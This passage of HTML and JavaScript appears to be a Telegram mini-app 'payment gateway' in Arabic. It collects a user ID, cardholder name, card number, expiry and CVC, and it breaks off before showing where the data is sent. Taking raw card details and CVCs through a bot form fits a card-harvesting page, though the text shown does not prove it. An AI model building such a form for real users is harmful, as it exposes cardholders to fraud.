<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        body {
            background-color: #f4f4f9;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .payment-card {
            background: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
        }
        input:focus {
            outline: 2px solid #4a90e2;
        }
        .row { display: flex; gap: 10px; }
        
        /* تصميم الزر المعطل (رمادي) */
        button {
            width: 100%;
            padding: 12px;
            background-color: #cccccc;
            color: #666666;
            border: none;
            border-radius: 8px;
            cursor: not-allowed;
            font-size: 16px;
            margin-top: 15px;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }
        
        /* تصميم الزر عندما يصبح مفعل (أزرق) */
        button.active {
            background-color: #4a90e2;
            color: white;
            cursor: pointer;
        }
        button.active:hover { background-color: #357abd; }
    </style>
</head>
<body>

    <div class="payment-card">
        <h2>💳 إتمام عملية الدفع</h2>
        <form id="paymentForm">
            <input type="text" id="userId" placeholder="معرف المستخدم (ID)" inputmode="numeric" required>
            
            <input type="text" id="name" placeholder="اسم صاحب البطاقة" required>
            
            <input type="text" id="cardNum" placeholder="رقم البطاقة (16 رقم)" maxlength="19" inputmode="numeric" required>
            
            <div class="row">
                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
                
                <input type="text" id="cvc" placeholder="CVC" maxlength="4" inputmode="numeric" required>
            </div>
            
            <button type="button" id="submitBtn" onclick="sendData()" disabled>دفع الآن</button>
        </form>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        const form = document.getElementById('paymentForm');
        const submitBtn = document.getElementById('submitBtn');

        // منع إدخال أي شيء عدا الأرقام لحقل الـ ID
        document.getElementById('userId').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            validateForm();
        });

        // منع إدخال أي شيء عدا الحروف والمسافات لحقل الاسم
        document.getElementById('name').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^a-zA-Z\s\u0600-\u06FF]/g, '');
            validateForm();
        });

        // تنسيق ومنع الحروف في رقم البطاقة
        document.getElementById('cardNum').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
            let parts = [];
            for (let i = 0; i < value.length; i += 4) {
                parts.push(value.substring(i, i + 4));
            }
            e.target.value = parts.join(' ');
            validateForm();
        });

        document.getElementById('expiry').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
            if (value.length >= 2) {
                e.target.value = value.substring(0, 2) + '/' + value.
